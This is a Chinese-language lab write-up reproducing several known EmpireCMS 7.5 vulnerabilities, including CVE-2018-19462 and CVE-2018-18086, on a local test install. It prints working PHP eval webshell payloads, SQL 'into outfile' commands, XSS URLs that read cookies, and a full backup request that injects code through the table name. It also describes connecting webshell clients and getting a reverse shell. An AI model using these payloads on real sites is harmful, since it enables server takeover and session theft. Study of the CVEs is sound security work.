


## 环境搭建

下载phpstudy 默认安装帝国cms7.5版本。一键搭建，然后默认地址为http://www.diguo.com/e/admin/ 账号密码admin/admin

## 帝国CMS(EmpireCMS) v7.5 代码注入分析(CVE-2018-19462)


mpireCMS7.5及之前版本中的admindbDoSql.php文件存在代码注入漏洞。该漏洞源于外部输入数据构造代码段的过程中,网路系统或产品未正确过滤其中的特殊元素。攻击者可利用该漏洞生成非法的代码段,修改网络系统或组件的预期的执行控制流。


## 复现过程

登陆后台，在系统-执行SQL语句中执行sql命令

```
select '<?php @eval($_POST[aaaa])?>' into outfile 'C:/phpstudy_pro/WWW/www.diguo.com/shell.php'
```
显示执行成功，执行失败看下失败的原因，主要是在mysql上的原因。

如果文件存在 不能覆盖
```
File 'C:/phpstudy_pro/WWW/upload/upload/shell.php' already exists
select '' into outfile 'C:/phpstudy_pro/WWW/upload/upload/shell.php'
```

如果路径不对

```
Can't create/write to file 'C:\phpstudy_pro\WW1W\upload\upload\shell.php' (Errcode: 2 - No such file or directory)
select '' into outfile 'C:/phpstudy_pro/WW1W/upload/upload/shell.php'
```

## 连接webshell
### 菜刀连接

第一次使用菜刀没有连接上，但是webshell能访问。

### 蚁剑连接

蚁剑连接编码器选择base64，解码器也选base64。这样成功率高些

### 冰蝎连接

刚开始很奇怪，冰蝎怎么连接都连不上，然后多下了几个版本的php。开始使用冰蝎连接，nice连上了。

验证了一下 php5.2版本的好像连接不上。
有时候解析失败了还是可以连接。

还没想好冰蝎的马怎么写进入。只会写一句话的。目前的方式是使用菜刀小马然后上传冰蝎马，然后反弹shell。

绕过的坑，sql执行的权限要高，否则不能写入shell文件。知道网站的路径。

和php的版本也有关系，版本在7.3以上菜刀就连接不上了。使用蚁剑可以连接。


## 参考连接

这里面讲解了漏洞的出现的方式
https://blog.catgames.cn/post/112.html
https://www.cnblogs.com/yuzly/archive/2004/01/13/11353929.html


## 帝国CMS(EmpireCMS) v7.5后台getshell分析(CVE-2018-18086)

### 漏洞描述

EmpireCMS 7.5版本及之前版本在后台备份数据库时,未对数据库表名做验证,通过修改数据库表名可以实现任意代码执行。EmpireCMS7.5版本中的/e/class/moddofun.php文件的”LoadInMod”函数存在安全漏洞,攻击者可利用该漏洞上传任意文件。

### 影响版本

EmpireCMS<=7.5

### 环境搭建

沿用phpstudy的部署环境

### 复现过程

进入到后台-系统-数据表雨系统模型-管理数据表-导入数据模型


![20201125092811](https://raw.githubusercontent.com/Hatcat123/GraphicBed/master/Img2/20201125092811.png)


上传木马模型
```
<?php file_put_contents("caidao.php","<?php @eval(\$_POST[cmd]); ?>");?>
```

![20201125142419](https://raw.githubusercontent.com/Hatcat123/GraphicBed/master/Img2/20201125142419.png)



路径为：
http://www.diguo.com/e/admin/caidao.php


菜刀与蚁剑连接


## EmpireCMS 7.5 前台xss


### 漏洞简介
该漏洞是由于javascript获取url的参数,没有经过任何过滤,直接当作a标签和img标签的href属性和src属性输出。

### 漏洞影响
EmpireCMS 7.5

### 利用过程
需要开启会员空间功能(默认关闭),登录后台开启会员空间功能
登录后台-点击系统-系统参数设置-用户设置-开启会员空间

![20201125143830](https://raw.githubusercontent.com/Hatcat123/GraphicBed/master/Img2/20201125143830.png)


payload：
javascript:alert(document.cookie)
```
http://www.diguo.com/e/ViewImg/index.html?url=javascript:alert(/xss/)
```

点击图片放大 弹出xss

![20201125144033](https://raw.githubusercontent.com/Hatcat123/GraphicBed/master/Img2/20201125144033.png)

菜鸟的我还不知道如果放大xss的危害。



## EmpireCMS 7.5 后台xss

### 漏洞简介
该漏洞是由于代码只使用htmlspecialchars进行实体编码过滤,而且参数用的是ENT_QUOTES(编码双引号和单引号),还有addslashes函数处理,但是没有对任何恶意关键字进行过滤,从而导致攻击者使用别的关键字进行攻击。

### 漏洞影响
EmpireCMS 7.5

### 漏洞复现
```
http://www.diguo.com/e/admin/openpage/AdminPage.php?mainfile=javascript:alert(/xss/)
```
提示非法来源

![20201125145204](https://raw.githubusercontent.com/Hatcat123/GraphicBed/master/Img2/20201125145204.png)

缺少参数，缺少参数去后台首页找到`ehash_ho28t=3UDcxRasb3N97RyFArXK`

http://www.diguo.com/e/admin/openpage/AdminPage.php?ehash_f9Tj7=ZMhwowHjtSwqyRuiOylK&mainfile=javascript:alert(/xss/)
http://www.diguo.com/e/admin/openpage/AdminPage.php?ehash_f9Tj7=ZMhwowHjtSwqyRuiOylK&mainfile=javascript:alert(document.cookie)

### 参考链接
https://www.shuzhiduo.com/A/ZOJPejMP5v/


## 帝国CMS(EmpireCMS) v7.5后台备份数据库任意代码执行

### 漏洞描述

EmpireCMS 7.5版本及之前版本在后台备份数据库时,未对数据库表名做验证,通过修改数据库表名可以实现任意代码执行。

### 影响版本

EmpireCMS<=7.5

### 环境搭建

同上

### 漏洞利用

点击 系统-备份数据-选择数据库-开始备份
![20201125171319](https://raw.githubusercontent.com/Hatcat123/GraphicBed/master/Img2/20201125171319.png)

备份路径为
```
C:\phpstudy_pro\WWW\www.diguo.com\e\admin\ebak\bdata\www_diguo_com_20201125162930VPDqZW
```
config.php的内容为

```
<?php
	$b_table="phome_enewszttype";
	$tb[phome_enewszttype]=1;

	$b_baktype=0;
	$b_filesize=300;
	$b_bakline=500;
	$b_autoauf=1;
	$b_dbname="www_diguo_com";
	$b_stru=1;
	$b_strufour=0;
	$b_dbchar="utf8";
	$b_beover=0;
	$b_insertf="replace";
	$b_autofield=",,";
	$b_bakdatatype=1;
	?>
```
phome_enewszttype 替换成phpinfo()，访问config路径便能查看config信息


使用bps抓包。点击备份，抓包。修改tablename的名字为php的信息。

```
POST /e/admin/ebak/phome.php HTTP/1.1
Host: www.diguo.com
Content-Length: 489
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1

……

ehash_e02b=37bded748e4584386415&rhash_c4a2=bdd19c4088ce&ehash_ho28t=3UDcxRasb3N97RyFArXK&ehash_5e03=e326dc43088d24d93327&rhash_264d=0d50e04c4c6a&rhash_J2s9U=9n2e91ZQZ5p0&ehash_6c2b=3e8ae51b0105e3b2e41e&phome=DoEbak&mydbname=www_diguo_com&baktype=0&filesize=300&bakline=500&autoauf=1&bakstru=1&dbchar=utf8&bakdatatype=1&mypath=www_diguo_com_20201125164337jHfvU5&insertf=replace&waitbaktime=0&readme=&autofield=&tablename%5B%5D=@eval($_POST[1234])&Submit=%E5%BC%80%E5%A7%8B%E5%A4%87%E4%BB%BD
```

提交后成功返回数据：查看到文件的路径
```
初使化备份成功，正在进入表备份．．．．．．<script>self.location.href='phome.php?phome=BakExe&t=0&s=0&p=0&mypath=www_diguo_com_20201125164337jHfvU5&waitbaktime=0&ehash_ho28t=3UDcxRasb3N97RyFArXK&rhash_J2s9U=9n2e91ZQZ5p0';</script>
```
然后使用蚁剑连接，访问config.php
http://www.diguo.com/e/admin/ebak/bdata/www_diguo_com_20201125164337jHfvU5/config.php

### 参考连接

https://www.cnblogs.com/yuzly/p/11369770.html






